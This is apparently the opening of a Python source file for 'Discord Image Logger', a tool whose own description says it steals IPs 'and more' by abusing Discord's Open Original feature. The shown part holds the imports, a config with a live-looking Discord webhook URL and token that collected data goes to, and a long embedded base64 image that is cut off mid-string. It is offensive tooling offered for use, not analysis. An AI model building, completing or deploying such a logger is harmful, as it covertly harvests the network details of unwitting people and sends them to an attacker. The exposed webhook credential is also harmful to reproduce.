# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1102262907359727646/yJnFO0qpvY-yDY8LSx8BR1VL740Js2CRJeOexvO6dpYXbKiNTffaTiVRRjV4ERmtJQc0",
    "image": "data:image/jpeg;base64,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